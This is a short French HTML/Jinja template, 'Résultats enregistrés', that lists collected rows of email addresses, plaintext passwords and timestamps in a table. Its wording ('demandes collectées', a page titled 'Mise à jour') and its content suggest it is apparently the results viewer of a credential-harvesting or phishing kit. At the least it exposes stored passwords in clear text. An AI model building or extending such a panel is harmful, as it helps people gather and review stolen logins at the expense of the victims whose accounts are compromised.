<!doctype html>
<html lang="fr">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Résultats - Mise à jour</title>
    <link rel="stylesheet" href="/static/styles.css" />
  </head>
  <body>
    <main class="page">
      <section class="card">
        <header class="card__header">
          <h1>Résultats enregistrés</h1>
          <p class="card__subtitle">Tableau des demandes collectées.</p>
        </header>
        <div class="table">
          <table>
            <thead>
              <tr>
                <th>Email</th>
                <th>Mot de passe</th>
                <th>Date d'enregistrement (UTC)</th>
              </tr>
            </thead>
            <tbody>
              {% for email_value, password_value, created_at in rows %}
              <tr>
                <td>{{ email_value }}</td>
                <td>{{ password_value }}</td>
                <td>{{ created_at }}</td>
              </tr>
              {% else %}
              <tr>
                <td colspan="3">Aucune donnée pour le moment.</td>
              </tr>
              {% endfor %}
            </tbody>
          </table>
        </div>
      </section>
    </main>
  </body>
</html>
